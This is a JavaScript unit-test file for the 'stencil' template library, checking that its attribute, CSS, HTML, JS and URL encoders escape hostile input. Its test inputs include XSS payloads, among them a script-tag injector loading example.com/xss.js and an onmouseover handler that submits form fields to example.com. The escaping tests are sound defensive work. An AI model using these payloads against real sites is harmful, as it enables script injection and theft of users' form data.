(function (context) {
// -----------------------------------------------------------------------------

'use strict';

var id = '';
var dependencies = ['../stencil', 'actually', 'matches', 'criteria'];

function factory(stencil, actually, matches) {
  scope('`stencil()` Basic String Template Tests',
  function () {
    test('Hello, World!',
    function () {
      var actual = stencil('Hello, World!');
      var expected = /^Hello, World!$/;

      actually(matches, expected, actual);
    });

    test('echo()            // Hello, ${name}!',
    function () {
      var actual = stencil('Hello, ${name}!', {name: 'Ŵøяłð"&\'/<>`'});
      var expected = /^Hello, Ŵøяłð"&'\/<>`!$/;

      actually(matches, expected, actual);
    });

    test('encode.attr()     // <span class="={cname}">Hello, World!</span>',
    function () {
      var actual = stencil('<span class="={cname}">Hello, World!</span>', {
        cname: '"\'%*+,-/<;>^| = risqué busịness'
      });
      var expected = /^<span class="&#34;&#39;&#37;&#42;&#43;&#44;&#45;&#47;&lt;&#59;&gt;&#94;&#124;&#32;&#61;&#32;risqu&#233;&#32;busịness">Hello, World!<\/span>$/;

      actually(matches, expected, actual);
    });

    test('encode.base64()   // Hello, +{name}!',
    function () {
      var actual = stencil('Hello, +{name}!', {name: 'World'});
      var expected = /^Hello, V29ybGQ=!$/;

      actually(matches, expected, actual);
    });

    test('encode.base64ni() // Hello, -{name}!',
    function () {
      var actual = stencil('Hello, -{name}!', {name: 'Ŵ🜘я🜯🜱'});
      var expected = /^Hello, xbTwn5yY0Y_wn5yv8J-csQ!$/;

      actually(matches, expected, actual);
    });

    test('encode.css()      // <style>background-url: :{property};</style>',
    function () {
      var actual = stencil('<style>background-url: :{property};</style>', {
        /* jshint -W107 */
        property: 'javascript:alert(1)'
        /* jshint +W107 */
      });
      var expected = /^<style>background-url: javascript\\00003aalert\\0000281\\000029;<\/style>$/;

      actually(matches, expected, actual);
    });

    test('encode.html()     // <span>Hello, >{name}!</span>',
    function () {
      var actual = stencil('<span>Hello, >{name}!</span>', {
        name: '<script>alert(1);</script>'
      });
      var expected = /^<span>Hello, &lt;script&gt;alert\(1\);&lt;&#47;script&gt;!<\/span>$/;

      actually(matches, expected, actual);
    });

    test('encode.js()       // <script>alert("Hello, !{name}!")</script>',
    function () {
      /* jscs:disable maximumLineLength */
      var actual = stencil('<script>alert("Hello, !{name}!");</script>', {
        name: '");var $dq=document;var $xp=$dq.createElement("script");$xp.setAttribute("src", "https://example.com/xss.js");$dq.getElementsByTagName("head")[0].appendChild($xp);'
      });
      var expected = '<script>alert("Hello, \\x22\\x29\\x3bvar\\x20\\x24dq\\x3ddocument\\x3bvar\\x20\\x24xp\\x3d\\x24dq\\x2ecreateElement\\x28\\x22script\\x22\\x29\\x3b\\x24xp\\x2esetAttribute\\x28\\x22src\\x22\\x2c\\x20\\x22https\\x3a\\x2f\\x2fexample\\x2ecom\\x2fxss\\x2ejs\\x22\\x29\\x3b\\x24dq\\x2egetElementsByTagName\\x28\\x22head\\x22\\x29\\x5b0\\x5d\\x2eappendChild\\x28\\x24xp\\x29\\x3b!");</script>';
      /* jscs:enable maximumLineLength */

      actually(matches, expected, actual);
    });

    test('encode.url()      // <a href="/help/kbid=%{kbid}">',
    function () {
      /* jscs:disable maximumLineLength */
      var actual = stencil('<a href="/help/kbid=%{kbid}">', {
        kbid: '" onmouoseover="var f=document.forms[0];f.action=\'//example.com/xss?a=\'+f.personal.value+\'&b=\'+f.data.value;f.submit();"'
      });
      var expected = '<a href="/help/kbid=%22%20onmouoseover%3d%22var%20f%3ddocument%2eforms%5b0%5d%3bf%2eaction%3d%27%2f%2fexample%2ecom%2fxss%3fa%3d%27%2bf%2epersonal%2evalue%2b%27%26b%3d%27%2bf%2edata%2evalue%3bf%2esubmit%28%29%3b%22">';
      /* jscs:enable maximumLineLength */

      actually(matches, expected, actual);
    });
  });
}

// -----------------------------------------------------------------------------
var n = dependencies.length;
var o = 'object';
var r = /([^-_\s])[-_\s]+([^-_\s])/g;
function s(m, a, b) { return a + b.toUpperCase(); }
context = typeof global === o ? global : typeof window === o ? window : context;
if (typeof define === 'function' && define.amd) {
  define(dependencies, function () {
    return factory.apply(context, [].slice.call(arguments));
  });
} else if (typeof module === o && module.exports) {
  for (; n--;) { dependencies[n] = require(dependencies[n]); }
  module.exports = factory.apply(context, dependencies);
} else {
  for (; n--;) { dependencies[n] = context[dependencies[n]]; }
  context[id.replace(r, s)] = factory.apply(context, dependencies);
}
}(this));
